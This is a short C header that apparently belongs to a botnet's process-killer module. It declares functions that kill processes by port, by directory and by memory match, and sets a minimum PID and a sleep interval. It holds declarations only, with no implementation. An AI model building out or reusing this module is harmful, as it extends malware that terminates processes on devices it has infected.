#pragma once

#include "includes.h"

#define KILLER_MIN_PID 400
#define KILLER_SLEEP_TIME 60

void killerinit(void);
void killer_kill(void);
BOOL killer_kill_by_port(port_t);
void openandclose(char *value);
void killer_kill_directories(void);

static BOOL mem_exists(char *, int, char *, int);
